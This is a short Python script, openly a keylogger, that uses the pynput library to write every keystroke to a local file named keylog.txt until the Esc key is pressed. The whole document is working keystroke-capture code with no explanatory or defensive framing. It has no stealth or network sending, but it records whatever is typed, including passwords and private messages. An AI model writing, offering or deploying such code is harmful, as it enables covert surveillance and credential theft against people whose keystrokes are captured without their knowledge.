import pynput.keyboard


def on_press(key):
    
    if key == pynput.keyboard.Key.esc:
        print("Keylogger stopped.")
        return False  
    
    with open('keylog.txt', 'a') as f:
        f.write(f'{key}\n')

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
